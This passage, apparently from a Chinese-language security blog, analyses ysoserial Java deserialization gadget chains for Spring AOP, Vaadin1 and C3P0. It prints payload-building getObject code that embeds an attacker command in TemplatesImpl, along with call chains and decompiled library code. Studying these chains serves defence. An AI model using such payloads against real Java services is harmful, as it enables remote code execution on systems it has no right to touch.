<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl 承载恶意指令</span></span><br><span class="line">    <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化 AdvisedSupport</span></span><br><span class="line">    AdvisedSupport as = <span class="keyword">new</span> AdvisedSupport();</span><br><span class="line">    as.setTargetSource(<span class="keyword">new</span> SingletonTargetSource(templates));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 JdkDynamicAopProxy 动态代理，代理 Type 和 Templates（TemplatesImpl 父类）</span></span><br><span class="line">    <span class="keyword">final</span> Type typeTemplatesProxy = Gadgets.createProxy(</span><br><span class="line">        (InvocationHandler) Reflections.getFirstCtor(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).newInstance(as),</span><br><span class="line">        Type.class,</span><br><span class="line">        Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代理 TypeProvider 的 getType 方法，返回 typeTemplatesProxy 代理类</span></span><br><span class="line">    <span class="keyword">final</span> Object typeProviderProxy = Gadgets.createMemoitizedProxy(</span><br><span class="line">        Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),</span><br><span class="line">        forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">    Object mitp = Reflections.createWithoutConstructor(forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 利用反射赋值，使用 typeProviderProxy 代理类 和 newTransformer 方法</span></span><br><span class="line">    Reflections.setFieldValue(mitp, <span class="string">&quot;provider&quot;</span>, typeProviderProxy);</span><br><span class="line">    Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mitp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用 AopUtils#invokeJoinpointUsingReflection() 方法反射调用对象的 method 方法并返回</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JdkDynamicAopProxy</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    Object oldProxy = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">boolean</span> setProxyContext = <span class="keyword">false</span>;</span><br><span class="line">    TargetSource targetSource = <span class="keyword">this</span>.advised.targetSource;  <span class="comment">// </span></span><br><span class="line">    Class&lt;?&gt; targetClass = <span class="keyword">null</span>;</span><br><span class="line">    Object target = <span class="keyword">null</span>;</span><br><span class="line">    Object var13;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) &#123;</span><br><span class="line">            Boolean var18 = <span class="keyword">this</span>.equals(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> var18;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) &#123;</span><br><span class="line">            Integer var17 = <span class="keyword">this</span>.hashCode();</span><br><span class="line">            <span class="keyword">return</span> var17;</span><br><span class="line">        &#125;</span><br><span class="line">        Object retVal;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.advised.opaque &amp;&amp; method.getDeclaringClass().isInterface() &amp;&amp; method.getDeclaringClass().isAssignableFrom(Advised.class)) &#123;</span><br><span class="line">            retVal = AopUtils.invokeJoinpointUsingReflection(<span class="keyword">this</span>.advised, method, args);</span><br><span class="line">            <span class="keyword">return</span> retVal;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.advised.exposeProxy) &#123;</span><br><span class="line">            oldProxy = AopContext.setCurrentProxy(proxy);</span><br><span class="line">            setProxyContext = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        target = targetSource.getTarget();  <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (target != <span class="keyword">null</span>) &#123;</span><br><span class="line">            targetClass = target.getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Object&gt; chain = <span class="keyword">this</span>.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);</span><br><span class="line">        <span class="keyword">if</span> (chain.isEmpty()) &#123;</span><br><span class="line">            retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args); <span class="comment">// 反射调用对象的 method 方法</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            MethodInvocation invocation = <span class="keyword">new</span> ReflectiveMethodInvocation(proxy, target, method, args, targetClass, chain);</span><br><span class="line">            retVal = invocation.proceed();</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; returnType = method.getReturnType();</span><br><span class="line">        <span class="keyword">if</span> (retVal != <span class="keyword">null</span> &amp;&amp; retVal == target &amp;&amp; returnType.isInstance(proxy) &amp;&amp; !RawTargetAccess.class.isAssignableFrom(method.getDeclaringClass()))</span><br><span class="line">            retVal = proxy;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retVal == <span class="keyword">null</span> &amp;&amp; returnType != Void.TYPE &amp;&amp; returnType.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AopInvocationException(<span class="string">&quot;Null return value from advice does not match primitive return type for: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line">        var13 = retVal; <span class="comment">// 返回方法</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target != <span class="keyword">null</span> &amp;&amp; !targetSource.isStatic()) &#123;</span><br><span class="line">            targetSource.releaseTarget(target);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setProxyContext) &#123;</span><br><span class="line">            AopContext.setCurrentProxy(oldProxy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var13;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AopUtils</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeJoinpointUsingReflection</span><span class="params">(Object target, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectionUtils.makeAccessible(method);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(target, args); <span class="comment">// 反射调用</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var4.getTargetException();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AopInvocationException(<span class="string">&quot;AOP configuration seems to be invalid: tried calling method [&quot;</span> + method + <span class="string">&quot;] on target [&quot;</span> + target + <span class="string">&quot;]&quot;</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AopInvocationException(<span class="string">&quot;Could not access method [&quot;</span> + method + <span class="string">&quot;]&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Vaddin1"><a href="#Vaddin1" class="headerlink" title="Vaddin1"></a>Vaddin1</h2><blockquote>
<p>Vaadin 是 Java Web 应用开发框架，用 Java 或 TypeScript 构建可伸缩的 UI，并使用集成的工具、组件和设计系统来更快地迭代、更好地设计和简化开发过程。<br>CC2 + CC5<br>使用 TemplatesImpl 承载恶意代码<br>通过动态代理 BadAttributeValueExpException 的反序列化触发</p>
</blockquote>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        PropertysetItem.toString()</span><br><span class="line">                PropertysetItem.getPropertyId()</span><br><span class="line">                    NestedMethodProperty.getValue()</span><br><span class="line">                        TemplatesImpl.getObjectPropertyValue()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/MJvkQ7gFzd3eA4x.png" >

<p>ysoserial.payloads.Vaadin1#getObject 返回动态代理 BadAttributeValueExpException。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">(String command)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl 承载恶意指令</span></span><br><span class="line">    Object templ = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储 Property 属性值</span></span><br><span class="line">    PropertysetItem pItem = <span class="keyword">new</span> PropertysetItem();        </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造 NestedMethodProperty 承载 TemplatesImpl</span></span><br><span class="line">    NestedMethodProperty&lt;Object&gt; nmprop = <span class="keyword">new</span> NestedMethodProperty&lt;Object&gt;(templ, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    pItem.addItemProperty (<span class="string">&quot;outputProperties&quot;</span>, nmprop);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 利用 BadAttributeValueExpException 的 val 字段承载 PropertysetItem</span></span><br><span class="line">    BadAttributeValueExpException b = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue (b, <span class="string">&quot;val&quot;</span>, pItem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>BadAttributeValueExpException.readObject 在反序列化时会调用对象的 toString 方法，这里即 PropertysetItem.toString，进一步触发 NestedMethodProperty.getValue</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BadAttributeValueExpException</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();    <span class="comment">// 调用对象的 toString 方法</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PropertysetItem</span></span><br><span class="line"><span class="keyword">private</span> LinkedList&lt;Object&gt; list = <span class="keyword">new</span> LinkedList(); <span class="comment">// 存储id</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Property <span class="title">getItemProperty</span><span class="params">(Object id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (Property)<span class="keyword">this</span>.map.get(id);  <span class="comment">// 获取属性</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String retValue = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    Iterator i = <span class="keyword">this</span>.getItemPropertyIds().iterator();</span><br><span class="line">    <span class="keyword">while</span>(i.hasNext()) &#123;    <span class="comment">// 遍历 id</span></span><br><span class="line">        Object propertyId = i.next();</span><br><span class="line">        retValue = retValue + <span class="keyword">this</span>.getItemProperty(propertyId).getValue <span class="comment">// 获取映射的 Property 属性对象，并调用其 getValue 方法</span></span><br><span class="line">        <span class="keyword">if</span> (i.hasNext()) &#123;</span><br><span class="line">            retValue = retValue + <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addItemProperty</span><span class="params">(Object id, Property property)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">&quot;Item property id can not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.map.containsKey(id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.map.put(id, property); <span class="comment">// 添加属性</span></span><br><span class="line">        <span class="keyword">this</span>.list.add(id);</span><br><span class="line">        <span class="keyword">this</span>.fireItemPropertySetChange();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NestedMethodProperty</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NestedMethodProperty</span><span class="params">(Object instance, String propertyName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.instance = instance;   <span class="comment">// 对象实例</span></span><br><span class="line">    <span class="keyword">this</span>.initialize(instance.getClass(), propertyName); <span class="comment">// 属性值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object object = <span class="keyword">this</span>.instance;</span><br><span class="line">        Iterator var2 = <span class="keyword">this</span>.getMethods.iterator();</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125;</span><br><span class="line">            Method m = (Method)var2.next();</span><br><span class="line">            object = m.invoke(object);  <span class="comment">// 反射调用封装对象指定属性的 getter 方法</span></span><br><span class="line">        &#125; <span class="keyword">while</span>(object != <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MethodException(<span class="keyword">this</span>, var4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h2><blockquote>
<p>C3P0 是一个开源的 JDBC 连接池，它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。目前使用它的开源项目有 Hibernate、Spring 等。</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>c3p0:0.9.5.2</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    PoolBackedDataSourceBase.readObject()</span><br><span class="line">        ReferenceIndirector.getObject()</span><br><span class="line">            ReferenceableUtils.referenceToObject()</span><br><span class="line">                Class.forName0()</span><br><span class="line">                    URLClassLoader.loadClass()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/mcCvQJ2HSIz7jFt.png" >

<p>PoolBackedDataSourceBase 类中储存了 PropertyChangeSupport 和 VetoableChangeSupport 对象，用于支持监听器的功能。</p>
<p>这个类在序列化和反序列化时，要保存内部的 ConnectionPoolDataSource 成员变量，如果 connectionPoolDataSource 本身是不可序列化的对象，则使用 ReferenceIndirector 对其进行引用的封装，返回一个可以被序列化的 IndirectlySerialized 实例对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolBackedDataSourceBase</span> <span class="keyword">extends</span> <span class="title">IdentityTokenResolvable</span> <span class="keyword">implements</span> <span class="title">Referenceable</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> PropertyChangeSupport pcs = <span class="keyword">new</span> PropertyChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">protected</span> VetoableChangeSupport vcs = <span class="keyword">new</span> VetoableChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        oos.writeShort(<span class="number">1</span>);</span><br><span class="line">        ReferenceIndirector indirector;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SerializableUtils.toByteArray(<span class="keyword">this</span>.connectionPoolDataSource);</span><br><span class="line">            oos.writeObject(<span class="keyword">this</span>.connectionPoolDataSource); <span class="comment">// 保存成员变量</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotSerializableException var9) &#123;   <span class="comment">// 如果该成员变量不可序列化</span></span><br><span class="line">            MLog.getLogger(<span class="keyword">this</span>.getClass()).log(MLevel.FINE, <span class="string">&quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;</span>, var9);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                indirector = <span class="keyword">new</span> ReferenceIndirector(); <span class="comment">// 使用 ReferenceIndirector 封装</span></span><br><span class="line">                oos.writeObject(indirector.indirectForm(<span class="keyword">this</span>.connectionPoolDataSource));    <span class="comment">// 返回 IndirectlySerialized</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var7;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;Problem indirectly serializing connectionPoolDataSource: &quot;</span> + var8.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>indirectForm 方法中调用会调用 ConnectionPoolDataSource 的 getReference 方法返回一个 Reference 对象，并使用 ReferenceSerialized 对象对其封装。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> IndirectlySerialized <span class="title">indirectForm</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Reference var2 = ((Referenceable)var1).getReference();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ReferenceIndirector.ReferenceSerialized(var2, <span class="keyword">this</span>.name, <span class="keyword">this</span>.contextName, <span class="keyword">this</span>.environmentProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PoolBackedDataSourceBase 类在反序列化时，调用 IndirectlySerialized#getObject 方法重新生成 ConnectionPoolDataSource 对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">short</span> version = ois.readShort();</span><br><span class="line">    <span class="keyword">switch</span>(version) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Object o = ois.readObject();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">            o = ((IndirectlySerialized)o).getObject();  <span class="comment">// 这里</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource)o;</span><br><span class="line">        <span class="keyword">this</span>.dataSourceName = (String)ois.readObject();</span><br><span class="line">        o = ois.readObject();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">            o = ((IndirectlySerialized)o).getObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.extensions = (Map)o;</span><br><span class="line">        <span class="keyword">this</span>.factoryClassLocation = (String)ois.readObject();</span><br><span class="line">        <span class="keyword">this</span>.identityToken = (String)ois.readObject();</span><br><span class="line">        <span class="keyword">this</span>.numHelperThreads = ois.readInt();</span><br><span class="line">        <span class="keyword">this</span>.pcs = <span class="keyword">new</span> PropertyChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.vcs = <span class="keyword">new</span> VetoableChangeSupport(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;Unsupported Serialized Version: &quot;</span> + version);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ReferenceSerialized#getObject 调用 InitialContext#lookup 方法尝试使用 JNDI 来获取相应的对象，在 contextName、env 均为空的情况下，则调用 ReferenceableUtils.referenceToObject() 使用 Reference 中的信息来获取。</p>
